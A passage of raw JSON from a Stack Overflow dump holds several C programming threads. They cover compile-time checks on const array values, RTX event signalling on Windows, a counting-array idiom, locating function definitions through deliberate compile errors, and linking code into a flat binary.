delivered (not everything is checked in pre checkin criteria). So the best thing would be to detect such thing at the compilation time. The question is if there is an existing trick for such thing..."}, {"owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "edited": false, "score": 0, "creation_date": 1544606367, "post_id": 53739166, "comment_id": 94331909, "body": "... anyway, I think what you suggested <code>[SPECIFIC_ADDR_IDX] = { .addr = SPECIFIC_ADDR, .val = 0 },</code> may do the job. If anyone will try to initialize elements at SPECIFIC_ADDR_IDX, it will raise compilation error."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1544606580, "post_id": 53739166, "comment_id": 94332054, "body": "No. It&#39;s just a warning on gcc, see <a href=\"https://godbolt.org/z/CC6vXZ\" rel=\"nofollow noreferrer\">godbolt</a>. I think I remember the C standard allowing duplicate initialization."}], "tags": [], "owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "is_accepted": true, "score": 1, "last_activity_date": 1544605667, "last_edit_date": 1544605667, "creation_date": 1544604548, "answer_id": 53739166, "question_id": 53738777, "link": "https://stackoverflow.com/questions/53738777/checking-constant-variables-value-at-the-compilation-time/53739166#53739166", "title": "Checking constant variable&#39;s value at the compilation time", "body": "<p>You can just specify the intex in initialization:</p>\n\n<pre><code>#define SPECIFIC_ADDR_IDX 0\n#define SPECIFIC_ADDR     8\n#define NOT_SPECIFIC_ADDR1 12\n#define NOT_SPECIFIC_ADDR2 16\n\ntypedef struct _struct_s\n{\n    const uint16_t addr; // addresses are constant and are not mutable\n    uint32_t       val;\n} struct_t;\n\nstruct_t globArr[] =\n{\n    [SPECIFIC_ADDR_IDX] = { .addr = SPECIFIC_ADDR, .val = 0 },\n    {.addr = NOT_SPECIFIC_ADDR1, .val = 0},\n    {.addr = NOT_SPECIFIC_ADDR2, .val = 0},\n};\n</code></pre>\n\n<p>Anyway you need to do runtime assertion, so use assert:</p>\n\n<pre><code>void globArr_unittest(void) {\n     assert(globArr[SPECIFIC_ADDR_IDX].addr == SPECIFIC_ADDR);\n}\n</code></pre>\n\n<p><code>static_assert</code> needs a constant expression. You can't write static assertions on variables values. Even if you did <code>static const struct_t globArr[]</code> still <code>globArr</code> value is not a constant expression. The C language has no <code>constexpr</code> (or <code>consteval</code>) specifier like C++. So, sadly, you can't do that in C.</p>\n\n<p><code>const</code> is just a modifier, it says that the variable can't be modified through <em>this handle</em>. <code>const</code> variables can be modified and are not immutable in C.</p>\n\n<p>It's just like you can't do:</p>\n\n<pre><code>#if globArr[SPECIFIC_ADDR_IDX].addr == SPECIFIC_ADDR\n</code></pre>\n\n<p>the same you can't</p>\n\n<pre><code>static_assert(globArr[SPECIFIC_ADDR_IDX].addr == SPECIFIC_ADDR, \"\");\n</code></pre>\n\n<p>What is a constant expression is probably nicely enumerated at <a href=\"https://en.cppreference.com/w/c/language/constant_expression\" rel=\"nofollow noreferrer\">cppreference</a>. The result of array subscript <code>[]</code> and member access <code>.</code> operators is not a constant expression, therefore it can't be used in static assertion.</p>\n"}], "owner": {"reputation": 6595, "user_id": 5218277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/ZuEZa.jpg?s=128&g=1", "display_name": "Alex Lop.", "link": "https://stackoverflow.com/users/5218277/alex-lop"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 238, "favorite_count": 0, "accepted_answer_id": 53739166, "answer_count": 1, "score": 0, "last_activity_date": 1544611160, "creation_date": 1544602849, "last_edit_date": 1544611160, "question_id": 53738777, "link": "https://stackoverflow.com/questions/53738777/checking-constant-variables-value-at-the-compilation-time", "title": "Checking constant variable&#39;s value at the compilation time", "body": "<p>For efficient code maintenance I need to make sure that the value at index 0 of an array is a specific predefined value. The following code doesn't work:</p>\n\n<pre><code>#define SPECIFIC_ADDR_IDX 0\n#define SPECIFIC_ADDR     8\n#define NOT_SPECIFIC_ADDR1 12\n#define NOT_SPECIFIC_ADDR2 16\n\ntypedef struct _struct_s\n{\n    const uint16_t addr; // addresses are constant and are not mutable\n    uint32_t       val;\n} struct_s;\n\nstruct_s globArr[] =\n{\n    {.addr = SPECIFIC_ADDR,      .val = 0},\n    {.addr = NOT_SPECIFIC_ADDR1, .val = 0},\n    {.addr = NOT_SPECIFIC_ADDR2, .val = 0},\n};\n\n// make sure the address at the SPECIFIC_ADDR_IDX is SPECIFIC_ADDR\n_Static_assert(globArr[SPECIFIC_ADDR_IDX].addr == SPECIFIC_ADDR, \" Illegal!\");\n</code></pre>\n\n<p>It gives the following compilation error:</p>\n\n<pre><code>error: expression in static assertion is not constant\n _Static_assert (globArr[SPECIFIC_ADDR_IDX].addr == SPECIFIC_ADDR, \" Illegal!\");\n                 ~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~\n</code></pre>\n\n<p>The <code>addr</code> is defined as <code>const uint16_t</code>, so I was thinking that its value is known at the compilation time.</p>\n\n<p>Is there an efficient way to perform such check at the compilation time?</p>\n\n<p><strong>Clarification:</strong> I understand that in this way I can't use the <code>_Static_assert</code>, <code>const</code> doesn't make a variable's value known at the compilation time. What I am asking is if anyone knows any kind of <em>trick</em> to deal with such issues.</p>\n\n<p><strong>The satisfying solution</strong> was proposed by Kamil Cuk. The initialization can be done with specifying the index:</p>\n\n<pre><code>struct_t globArr[] =\n{\n    [SPECIFIC_ADDR_IDX] = { .addr = SPECIFIC_ADDR, .val = 0 },\n    {.addr = NOT_SPECIFIC_ADDR1, .val = 0},\n    {.addr = NOT_SPECIFIC_ADDR2, .val = 0},\n};\n</code></pre>\n\n<p>In such case if there would be additional initialization of entry at index [SPECIFIC_ADDR_IDX], the compiler will issue a warning (not guaranteed but most compilers will). Just make sure to compile with <em>warning=error</em> option ON.</p>\n"}, {"tags": ["c++", "c", "windows", "64-bit", "rtx"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544610414, "post_id": 53738591, "comment_id": 94334402, "body": "The proper solution is not to close the event while your program is still using it. It&#39;s common sense, really. If you need to shut down multiple threads, you can have an event for that too, then let them finish gracefully on their own before closing the handles."}, {"owner": {"reputation": 380, "user_id": 5627004, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d69032ea3d27e87d4303b8ae5e3ee07?s=128&d=identicon&r=PG&f=1", "display_name": "Wolfgang Roth", "link": "https://stackoverflow.com/users/5627004/wolfgang-roth"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544623559, "post_id": 53738591, "comment_id": 94341941, "body": "@Lundin, that&#39;s not the point of my question. If the program that created the event crashes without setting the event for another programm to be signalled, i have no chance to see if the event is still valid. Maybe both programs created/opened the event a long time ago the waitforsingleobject could refer to an invalid handle because the creating program has already exited..."}], "owner": {"reputation": 380, "user_id": 5627004, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/3d69032ea3d27e87d4303b8ae5e3ee07?s=128&d=identicon&r=PG&f=1", "display_name": "Wolfgang Roth", "link": "https://stackoverflow.com/users/5627004/wolfgang-roth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 126, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1544602054, "creation_date": 1544602054, "question_id": 53738591, "link": "https://stackoverflow.com/questions/53738591/waitforsingleobject-and-events-unclear-behaviour", "title": "WaitForSingleObject and Events, unclear behaviour", "body": "<p>I wrote two little test applications with Visual Studio 2017 on Windows 10 64 bit with which I wanted to test Events and WaitForSingleObject.</p>\n\n<p>I am also using RTX realtime extensions from intervalzero.</p>\n\n<p>One of my application is written in x64 Code for the windows part, the other in x64 Code for the RTX subsystem.</p>\n\n<p>Now my idea was to Create an event from within RTX 64 and have it signaled 10 times with a given pause time between the signalling:</p>\n\n<pre><code>int _tmain(int argc, _TCHAR * argv[])\n{\n\n    RtPrintf(\"Starte RTX-Applikation\\n\");\n    RtSleep(0);\n    HANDLE hEvent = RtCreateEvent(NULL, false, false, _T(\"flexLZSStart\"));\n    if (hEvent != INVALID_HANDLE_VALUE)\n    {\n        RtPrintf(\"Event erzeugt\\n\");\n        for (size_t i = 0; i &lt; 10 ; i++)\n        {\n                RtSetEvent(hEvent);\n                RtPrintf(\"Event gesetzt\\n\");\n                RtSleep(1500);\n        }\n        RtCloseHandle(hEvent);\n    }\n\n    RtPrintf(\"exit process\\n\");\n    return 0;\n}\n</code></pre>\n\n<p>On the other hand the windows application checks for the creation of the event and then checks repeatedly if the event is signalled:</p>\n\n<pre><code>int main()\n{\n    Sleep(150);\n    HANDLE hEvent = NULL;\n    DWORD dwstart = GetTickCount();\n    printf(\"wait for creation of event\\n\");\n    while (hEvent == NULL)\n    {\n        hEvent = RtOpenEvent(NULL, NULL, _T(\"flexLZSStart\"));\n    }\n    if ((hEvent == INVALID_HANDLE_VALUE) || (hEvent == NULL))\n    {\n        exit(-2);\n    }\n//#define REOPEN\n    if ((hEvent != INVALID_HANDLE_VALUE) &amp;&amp; (hEvent != NULL))\n    {\n        DWORD dwErg;\n        BOOLEAN aborted = false;\n        printf(\"Event has been created.\\n\");\n#ifdef REOPEN\n        RtCloseHandle(hEvent);\n#endif\n        do\n        {\n            printf(\"Wait for event to be signaled\\n\");\n#ifdef REOPEN\n            hEvent = RtOpenEvent(NULL, NULL, _T(\"flexLZSStart\"));\n            if (hEvent == NULL)\n            {\n                printf(\"Event has been disposed?\\n\");\n                break;\n            }\n#endif\n            dwErg = RtWaitForSingleObject(hEvent,1000);\n#ifdef REOPEN\n            RtCloseHandle(hEvent);\n#endif\n            DWORD dwLastError = GetLastError();\n            if (dwLastError != 0)\n            {\n                printf(\"GetLastError returned %d!\\n\", dwLastError);\n            }\n            switch (dwErg)\n            {\n            case WAIT_OBJECT_0:\n                printf(\"received Event\\n\");\n                RtResetEvent(hEvent);\n                break;\n            case WAIT_TIMEOUT:\n                //printf(\"event not yet received\\n\");\n                break;\n            case WAIT_ABANDONED:\n            {\n                printf(\"owner of event has been killed\\n\");\n                aborted = true;\n            }\n            break;\n            default:\n            {\n                printf(\"no valid return value: %d\\n\", dwErg);\n                aborted = true;\n            }\n            break;\n            }\n        } while (!aborted);\n\n    }\n    printf(\"loop exited\\n\");\n    exit(0);\n}\n</code></pre>\n\n<p>Now my observation is, that the RTX code runs through fine, and exits after having signaled the event 10 times.</p>\n\n<p>On the other hand the windows code receives the event 10 times, but it doesnt detect when the rtx application closed the event.</p>\n\n<p>If I compile the code with <code>REOPEN</code> defined, the windows code exits with the 11. open of the event, because it is no more available.</p>\n\n<p>I should enhance my code by having a second event, that is triggered by the windows code after it received the first event, so that the rtx code waits until the windows code has finished its work.</p>\n\n<p>But my final question is:</p>\n\n<p>What is the propper way to detect if the source of the event is still valid? </p>\n\n<p>Can I detect, that the rtx code has created the event, but not yet signalled it, before it eventually has exited?</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 767708, "user_id": 14860, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/vXG1F.png?s=128&g=1", "display_name": "paxdiablo", "link": "https://stackoverflow.com/users/14860/paxdiablo"}, "is_accepted": false, "score": 6, "last_activity_date": 1544600904, "creation_date": 1544600904, "answer_id": 53738309, "question_id": 53738226, "link": "https://stackoverflow.com/questions/53738226/i-dont-get-this-line-marks-counttotal-marksi-please-anyone-describe-i/53738309#53738309", "title": "i don&#39;t get this line , marks_count[total_marks[i]]++; please, anyone describe it", "body": "<p>The <code>total_marks</code> array holds all the marks that people got in the test (assuming it is a test, of course).</p>\n\n<p>What:</p>\n\n<pre><code>marks_count[total_marks[i]]++;   \n</code></pre>\n\n<p>does is to increment an array element corresponding to the mark somebody got. In other words, it's counting the number of results of each mark.</p>\n\n<p>In more details:</p>\n\n<pre><code>// Initialise all counts to zero.\n\nfor(i = 0; i &lt; 101; i++) {   \n    marks_count[i] = 0;   \n}   \n\n// For each of forty results, increment the\n// count corresponding to the result.\n\nfor(i = 0; i &lt; 40; i++) {   \n    marks_count[total_marks[i]]++;   \n}   \n</code></pre>\n\n<p>If, for example, the array was simply <code>{42, 7, 42}</code> (and the size corrected to three rather than forty), you'd end up with an array of mostly zeros, other than:</p>\n\n<pre><code>marks_count[7]  = 1\nmarks_count[42] = 2\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10776367, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-qrUmc9w1SFg/AAAAAAAAAAI/AAAAAAAAAQc/t0KAoJBvEDU/photo.jpg?sz=128", "display_name": "Lidan Suidan", "link": "https://stackoverflow.com/users/10776367/lidan-suidan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": -7, "last_activity_date": 1544600904, "creation_date": 1544600564, "last_edit_date": 1544600632, "question_id": 53738226, "link": "https://stackoverflow.com/questions/53738226/i-dont-get-this-line-marks-counttotal-marksi-please-anyone-describe-i", "title": "i don&#39;t get this line , marks_count[total_marks[i]]++; please, anyone describe it", "body": "<p>I don't get this line: <code>marks_count[total_marks[i]]++;</code>. Please describe its meaning.</p>\n\n<pre><code>int i;   \nint total_marks[] = {86, 78, 94, 68, 92, 78, 64, 62, 72, 61, 72, 66, 65, 65, 80, 72, 62, 68, 81, 62, 56, 68, 58, 56, 82, 70, 74, 78, 76, 84, 88, 73, 62, 66, 76, 70, 67, 65, 77, 63};   \nint marks_count[101];   \nfor(i = 0; i &lt; 101; i++) {   \n    marks_count[i] = 0;   \n}   \nfor(i = 0; i &lt; 40; i++) {   \n    marks_count[total_marks[i]]++;   \n}   \nfor(i = 50; i &lt;= 100; i++) {   \n    printf(\"Marks: %d Count: %d\\n\", i, marks_count[i]);   \n}\n</code></pre>\n"}, {"tags": ["c", "function", "compilation"], "comments": [{"owner": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 1, "creation_date": 1544600295, "post_id": 53738067, "comment_id": 94328881, "body": "The error tells you about a conflict between the indicated line of code (should be part of the error message) and the &quot;previous&quot; function declaration (in the indicated header file) - that&#39;s all the information you should need to figure out what causes the conflict."}, {"owner": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 0, "creation_date": 1544600547, "post_id": 53738067, "comment_id": 94328987, "body": "If you show your actual code (as a <a href=\"https://stackoverflow.com/help/mcve\">minimal, complete and verifiable example</a>), as well as the complete error message, we can give more targeted advice."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544600986, "post_id": 53738067, "comment_id": 94329180, "body": "Is there a reason why you aren&#39;t using an IDE which can find the declaration/definition for you? Too practical?"}, {"owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544605102, "post_id": 53738067, "comment_id": 94331151, "body": "@Lundin the reason why we don&#39;t us IDE is the volume of code quite bigger to be handled with modern IDE."}, {"owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "reply_to_user": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 0, "creation_date": 1544605988, "post_id": 53738067, "comment_id": 94331659, "body": "@SanderDeDycker I did not mean there is definitely a way to find a way by this method. If there is a method using compile error or link error, i would be interested to know. Also if there exists a radically different approach, they are also welcome. I just need to find a the line number and file where the function is am using."}, {"owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "edited": false, "score": 0, "creation_date": 1544606354, "post_id": 53738067, "comment_id": 94331900, "body": "<code>grep</code> to the rescue! ;)"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1544606575, "post_id": 53738067, "comment_id": 94332050, "body": "@MithunB What do yo mean &quot;the volume of code quite bigger to be handled with modern IDE&quot;. That sounds like utter nonsense."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1544614330, "post_id": 53738067, "comment_id": 94336669, "body": "You can try deliberately addind a duplicate definition in a separate translation unit. Then link <i>all</i> object files together (compiled with debugging symbols enabled). The linker will tell you in what file and on what line the duplicate is defined."}, {"owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1544616258, "post_id": 53738067, "comment_id": 94337788, "body": "@n.m. You have understood my query exactly right. Your suggestion worked for my test c functions finding method. Let me apply this on project I am working on let you know the results."}, {"owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1545203956, "post_id": 53738067, "comment_id": 94540187, "body": "@n.m you can post an answer on the suggestion you have made. This is the best one so far I have came across."}], "answers": [{"comments": [{"owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "edited": false, "score": 0, "creation_date": 1544612629, "post_id": 53740471, "comment_id": 94335724, "body": "The -E option will do a preprocessing part of compilation process in gcc. That will print the entire code. What i am looking for is to get to line number, path and file name which has the definition of function by deliberately adding an error at the place where we are calling the function; which the compile points us to look in. I would edit my question with an example."}], "tags": [], "owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "is_accepted": false, "score": 0, "last_activity_date": 1544615181, "last_edit_date": 1544615181, "creation_date": 1544608938, "answer_id": 53740471, "question_id": 53738067, "link": "https://stackoverflow.com/questions/53738067/search-c-function-definition-using-compilation-error/53740471#53740471", "title": "Search C function definition using Compilation Error", "body": "<p>Maybe you are looking for <code>-E</code> switch ?</p>\n\n<pre><code>// a.h\nint a() {\n  return 1;\n}\n</code></pre>\n\n<p>and then, we have</p>\n\n<pre><code>// main.c\n#include \"a.h\"\n\nint main() {\n  return a();\n}\n</code></pre>\n\n<p>and, with <code>-E</code> you can get</p>\n\n<pre><code>&gt; gcc -E main.c\n# 1 \"main.c\"\n# 1 \"&lt;built-in&gt;\" 1\n# 1 \"&lt;built-in&gt;\" 3\n# 331 \"&lt;built-in&gt;\" 3\n# 1 \"&lt;command line&gt;\" 1\n# 1 \"&lt;built-in&gt;\" 2\n# 1 \"main.c\" 2\n# 1 \"./a.h\" 1\nint a() {\n  return 1;\n}\n# 2 \"main.c\" 2\n\nint main() {\n  return a();\n}\n</code></pre>\n\n<p>now, let's say our source has another file</p>\n\n<pre><code>// b.h\nfloat a() {\n  return 1.0;\n}\n</code></pre>\n\n<p>and <code>main.c</code> is slightly different</p>\n\n<pre><code>#include \"a.h\"\n#include \"b.h\"\n\nint main() {\n  return a();\n}\n</code></pre>\n\n<p>you will be able to see the last definition of function</p>\n\n<pre><code>gcc -c -E main.c\n# 1 \"main.c\"\n# 1 \"&lt;built-in&gt;\" 1\n# 1 \"&lt;built-in&gt;\" 3\n# 331 \"&lt;built-in&gt;\" 3\n# 1 \"&lt;command line&gt;\" 1\n# 1 \"&lt;built-in&gt;\" 2\n# 1 \"main.c\" 2\n# 1 \"./a.h\" 1\nint a() {\n  return 1;\n}\n# 2 \"main.c\" 2\n# 1 \"./b.h\" 1\nfloat a() {\n  return 1.0;\n}\n# 3 \"main.c\" 2\n\nint main() {\n  return a();\n}\n</code></pre>\n\n<p>But, I am not sure whether this is something you are looking for ;)</p>\n\n<p>Hmm ... if you want to stop at certain point, maybe this one will help you:</p>\n\n<pre><code>#include \"a.h\"\n#include \"b.h\"\n\nint main() {\n  a();\n  #error Quit!\n  printfun(\"aaa\");\n}\n</code></pre>\n\n<p>and this way, compilation will fail a <code>#error</code></p>\n\n<pre><code>&gt; gcc -c  -Wfatal-errors main.c\nIn file included from main.c:2:\n./b.h:1:7: fatal error: conflicting types for 'a'\nfloat a() {\n      ^\n./a.h:1:5: note: previous definition is here\nint a() {\n    ^\n1 error generated.\n</code></pre>\n\n<p>Or, you can simply introduce some sort of fake type</p>\n\n<pre><code>#include \"a.h\"\n\nstruct fake_type {\n  int fake_component;\n};\n\nstruct fake_type *a();\n\nint main() {\n  a();\n}\n</code></pre>\n\n<p>and enforce the error</p>\n\n<pre><code>&gt; gcc -c  -Wfatal-errors main.c\nmain.c:7:19: fatal error: conflicting types for 'a'\nstruct fake_type *a();\n                  ^\n./a.h:1:5: note: previous definition is here\nint a() {\n    ^\n1 error generated.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "is_accepted": true, "score": 1, "last_activity_date": 1545208078, "creation_date": 1545208078, "answer_id": 53847225, "question_id": 53738067, "link": "https://stackoverflow.com/questions/53738067/search-c-function-definition-using-compilation-error/53847225#53847225", "title": "Search C function definition using Compilation Error", "body": "<p>You can try deliberately addind a duplicate definition in a separate translation unit. Then link <em>all</em> object files together (compiled with debugging symbols enabled). The linker will tell you in what file and on what line the duplicate is defined.</p>\n"}], "owner": {"reputation": 185, "user_id": 3232487, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/df397f9a84e4a88928975cde16bf13e0?s=128&d=identicon&r=PG&f=1", "display_name": "Mithun B", "link": "https://stackoverflow.com/users/3232487/mithun-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 53847225, "answer_count": 2, "score": 0, "last_activity_date": 1545208078, "creation_date": 1544599923, "last_edit_date": 1544613587, "question_id": 53738067, "link": "https://stackoverflow.com/questions/53738067/search-c-function-definition-using-compilation-error", "title": "Search C function definition using Compilation Error", "body": "<p>I am working on a C project which has same definition of C function in multiple places. I am trying to get the definition of C function using compilation errors like \"error: conflicting types for foo_func()\"; which also provides header file declaration as \"bar_file.h:&lt; line no >: note: previous declaration of foo_func() was here\". I want to rely on compilation error instead of grep like commands because compiler knows for sure which function it is linking with, so I can be sure of the function definition which is being used.</p>\n\n<p>I am able to locate the header file with deliberately applying compilation error. Is there a way to use the similar technique to find the definition of function I am using at compilation time?</p>\n\n<p>Example: Let's find the header file which has the declaration of the function we are using. We can end up into the following compilation error by purposeful introduction of multiple definition with a known parameter mismatch.</p>\n\n<pre><code>$ gcc -Wall -Wextra -c exmpl_01.c -I./\nexmpl_01.c:5: error: conflicting types for \u2018call_func_other_file\u2019\nexmpl_01.h:1: note: previous declaration of \u2018call_func_other_file\u2019 was here\n\n$ head -4 exmpl_01.c\n#include &lt;stdio.h&gt;\n#include \"exmpl_01.h\"\nint call_func(void);\nint call_func_other_file(char *);\n\n$ cat exmpl_01.h\nint call_func_other_file(void);\n</code></pre>\n"}, {"tags": ["c", "linux", "gcc", "x86"], "comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1544600776, "post_id": 53738012, "comment_id": 94329084, "body": "<code>gcc -c</code> compiles + assembles but doesn&#39;t link.  But it sounds like what you really need is a linker script to produce a flat binary instead of an ELF executable.  Or <code>objcopy</code> to copy a section of a linked executable to a flat binary."}, {"owner": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1544605082, "post_id": 53738012, "comment_id": 94331142, "body": "i tried objcopy, but it just gave me some bogus. I could not even find the opcodes from the output file in the file objcopy gave me. Also, i would need the addresses to match up, or only have position independent code. So yeah, it sounds like i would indeed need some way to tell the linker what i want"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1544605442, "post_id": 53738012, "comment_id": 94331342, "body": "Linker scripts exist to tell the linker what you want. See   <a href=\"https://wiki.osdev.org/Bare_Bones#Linking_the_Kernel\" rel=\"nofollow noreferrer\">wiki.osdev.org/Bare_Bones#Linking_the_Kernel</a>, or many Stack Overflow answers with linker scripts.  If you don&#39;t want to go completely PIC, then yeah you&#39;ll want to link your code into a static executable."}], "answers": [{"comments": [{"owner": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": "Boldar", "link": "https://stackoverflow.com/users/10779469/boldar"}, "edited": false, "score": 0, "creation_date": 1544626006, "post_id": 53742891, "comment_id": 94343394, "body": "that points into the right direction, but is not quite what i want. I do not want it to output an executable. I want it to output a binary blob, which will only work if it gets somehow mapped at the specified address and manually jumped into. I do not want an elf.  Edit: To clarify: i want something i can manually put together using a hex editor"}, {"owner": {"reputation": 73, "user_id": 10779469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e03d108795b62ad12bcb34b8a422035?s=128&d=identicon&r=PG&f=1", "display_name": 